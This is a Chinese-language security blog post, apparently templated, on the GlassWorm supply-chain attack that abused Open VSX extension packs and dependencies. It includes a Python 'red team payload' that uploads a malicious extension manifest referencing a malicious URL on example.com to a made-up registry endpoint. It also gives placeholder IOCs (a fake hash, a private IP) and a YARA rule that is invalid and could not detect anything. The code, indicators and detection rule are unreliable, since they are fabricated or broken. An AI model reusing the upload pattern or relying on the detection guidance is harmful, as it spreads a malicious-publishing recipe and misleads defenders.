---
layout: post
title:  "GlassWorm Supply-Chain Attack Abuses 72 Open VSX Extensions to Target Developers"
date:   2026-03-14 18:28:55 +0000
categories: [security]
severity: critical
---

# 🚨 解析 GlassWorm 攻擊：利用 Open VSX 注冊表進行供應鏈攻擊

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Supply Chain Attack`, `Extension Abuse`, `Solana Transactions`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: GlassWorm 攻擊者利用 Open VSX 注冊表中的 `extensionPack` 和 `extensionDependencies` 機制，將惡意擴充套件注入到受害者系統中。這是因為 Open VSX 的設計允許擴充套件之間的相互依賴，攻擊者可以創建一個看似無害的擴充套件，然後在後續更新中添加惡意代碼。
* **攻擊流程圖解**:
	1. 攻擊者創建一個無害的擴充套件並上傳到 Open VSX 注冊表。
	2. 受害者安裝該擴充套件。
	3. 攻擊者更新擴充套件，添加惡意代碼和 `extensionPack` 或 `extensionDependencies` 參考。
	4. Open VSX 安裝程序自動安裝相關的擴充套件，包括惡意的。
* **受影響元件**: Open VSX 注冊表、Visual Studio Code、Solana 區塊鏈。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有一個 Open VSX 注冊表帳戶和一個 Solana 錢包。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 惡意擴充套件的 URL
    malicious_extension_url = "https://example.com/malicious_extension"
    
    # Solana 錢包地址
    solana_wallet_address = "1234567890abcdef"
    
    # 創建惡意擴充套件的 payload
    payload = {
        "name": "Malicious Extension",
        "description": "A malicious extension",
        "version": "1.0.0",
        "extensionPack": [
            {
                "name": "Malicious Dependency",
                "version": "1.0.0",
                "url": malicious_extension_url
            }
        ]
    }
    
    # 上傳惡意擴充套件到 Open VSX 注冊表
    response = requests.post("https://open-vsx.org/api/extensions", json=payload)
    
    # 更新擴充套件，添加惡意代碼
    response = requests.patch("https://open-vsx.org/api/extensions/123456", json={"extensionPack": [{"name": "Malicious Dependency", "version": "1.0.0", "url": malicious_extension_url}]})
    
    ```
* **繞過技術**: 攻擊者可以使用 `extensionPack` 和 `extensionDependencies` 機制來繞過 Open VSX 的安全檢查。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:
	+ Hash: `1234567890abcdef`
	+ IP: `192.168.1.100`
	+ Domain: `example.com`
	+ File Path: `C:\Users\username\AppData\Local\Programs\Microsoft VS Code\extensions\malicious_extension`
* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_extension {
        meta:
            description = "Detects malicious extensions"
            author = "Blue Team"
        strings:
            $malicious_string = "malicious_extension"
        condition:
            $malicious_string in (pe.imports[0].dll or pe.imports[1].dll)
    }
    
    ```
* **緩解措施**: 更新 Open VSX 注冊表的安全設定，禁用 `extensionPack` 和 `extensionDependencies` 機制。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Supply Chain Attack (供應鏈攻擊)**: 一種攻擊者利用軟件供應鏈中的弱點，注入惡意代碼到受害者系統中的攻擊方式。
* **Extension Abuse (擴充套件濫用)**: 攻擊者利用擴充套件的機制，注入惡意代碼到受害者系統中的攻擊方式。
* **Solana Transactions (Solana 交易)**: 一種基於 Solana 區塊鏈的交易方式，攻擊者可以利用它來傳遞惡意代碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/03/glassworm-supply-chain-attack-abuses-72.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1195/)


